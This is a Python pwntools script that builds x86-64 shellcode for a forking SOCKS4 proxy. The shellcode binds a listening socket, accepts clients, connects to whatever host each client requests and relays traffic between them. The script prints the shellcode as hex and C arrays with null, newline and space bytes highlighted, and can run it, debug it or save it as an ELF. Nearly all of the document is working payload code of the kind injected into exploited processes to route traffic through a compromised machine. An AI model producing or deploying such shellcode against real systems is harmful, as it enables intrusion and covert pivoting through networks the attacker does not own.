from pwn import *
context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]    # for command line terminal, launch tmux first before launching python code
context.log_level = 'info'
import ctypes, struct, sys, os, socket

if (len(sys.argv) < 3):
  print('%s <IP> <PORT> [RUN]' % (sys.argv[0]))
  exit(1)

# define HOST & PORT here or in command line
IP, PORT = (sys.argv[1], int(sys.argv[2],10)) if len(sys.argv) > 2 else ('127.0.0.1', 12490)

def sockaddr():
    global negated
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    return hex((number + (1 << 64)) % (1 << 64))

def dumpit(shellc):
  print('shellcode length: {:d} bytes'.format(len(shellc)))
  # dump as hex number array
  print('\n\"\\x{}\"'.format('\\x'.join([format(b, '02x') for b in bytearray(shellc)])))
  # dump as C array
  print("\nunsigned char shellc[] = {{{}}};".format(", ".join([format(b, '#02x') for b in bytearray(shellc)])))
  # dump as hex array
  print('\npossibly problematic values are highlighted (00,0a,20)...\n')
  print(hexdump(shellc, highlight=b'\x0a\x20\x00'))

shellc = asm ('''
socket:
	push 41
	pop rax
	cdq
	push 2
	pop rdi
	push 1
	pop rsi
	syscall
	mov ebp,eax		/* store server socket in rbp*/
bind:
	push rbp
	pop rdi
	mov rcx, '''+sockaddr()+'''
	neg rcx
	push rcx
	push rsp
	pop rsi
	mov al,49
	mov dl,16
	syscall
	test eax,eax
	jnz exit
listen:
	push rdx
	pop rsi		/* backlog = rdx = 16, change it if you want... */
	mov al,50
	syscall

accept:
	push rbp
	pop rdi
	mov al,43
	cdq
	xor esi,esi
	syscall
	xchg r9,rax		 /* store client socket in r9


/* we fork for handing client request*/
fork:
	push 57
	pop rax
	syscall
	test eax,eax
	jz fork2
wait:
	push rax
	pop rdi
	push rsp
	pop rsi
	xor edx,edx
	xor r10,r10
	push 61
	pop rax
	syscall

/* parent close client socket and loop back waiting for clients*/
	push r9
	pop rdi
	push 3
	pop rax
	syscall
	jmp accept

fork2:
	push 57
	pop rax
	syscall
	test eax,eax
	jz read
	jmp exit

/* send back answer, inputs:   rsi points to buffer, ax contains answer code */
answer:
	mov	word ptr[rsi],ax
	push r9
	pop rdi
	push 8
	pop rdx
	push 1
	pop rax
	syscall
	ret
nogood:
	mov ah,0x5b
	call answer
exit:
	push 60
	pop rax
	syscall

/* read SOCKS first packet*/
read:
/* make space on stack */
	push rax
	push rax
	push rsp
	pop rsi
	push r9
	pop rdi
	mov dl,9
	syscall
	cmp al,9
	jnz exit
	cmp word ptr[rsi],0x104
	jnz nogood

/* create socket for requested connection */
socket2:
	mov al,41
	cdq
	push 2
	pop rdi
	push 1
	pop rsi
	syscall
	mov ebp,eax		/* store server socket in rbp*/
connect:
	xchg eax,edi
	push rsp
	pop rsi
	mov word ptr[rsi],ax	/* rax was already 2 from socket */
	mov al,42
	mov dl,16
	syscall
	test eax,eax
	jnz nogood

	mov ah,0x5a
	call answer

copyloop:
/* create structure pollfd on stack*/
	shl rax,29		/* rax is 8 after answer */
	lea rsi,[rax+rbp]
	push rsi
	lea rsi,[rax+r9]
	push rsi
/* poll */
poll:
	push rsp
	pop rdi
	push 2
	pop rsi
	mov edx,edi	/* timeout in milliseconds , random value*/ 
	push 7
	pop rax
	syscall
	test eax,eax
	jle exit

	test byte ptr[rdi+6],1
	push r9
	push rbp
	jne next2
	pop rdi
	pop r14
	jmp next3
next2:
	pop r14
	pop rdi
next3:
/* read */
	push rsp
	pop rsi
	xor edx,edx
	mov dh,64	/* reserve 0x4000 on stack, adjust it if needed*/
	sub rsi,rdx
	xor eax,eax
	syscall
	test eax,eax
	jle exit
	mov edx,eax
/* write */
sendloop:
	mov rdi,r14
	xor eax,eax
	mov al,1
	syscall
	test eax,eax
	jle exit
	add	rsi,rax
	sub	edx,eax
	jne sendloop
	jmp poll
''')

dumpit(shellc)

if args.EXE:
  ELF.from_bytes(shellc).save('binary')

if args.RUN:
  p = run_shellcode(shellc)
  p.interactive()
elif args.GDB:
  p = debug_shellcode(shellc, gdbscript='''
    # set your pwndbg path here
    source ~/gdb.plugins/pwndbg/gdbinit.py
    set follow-fork-mode child
    set detach-on-fork off
    context
  ''')
  p.interactive()
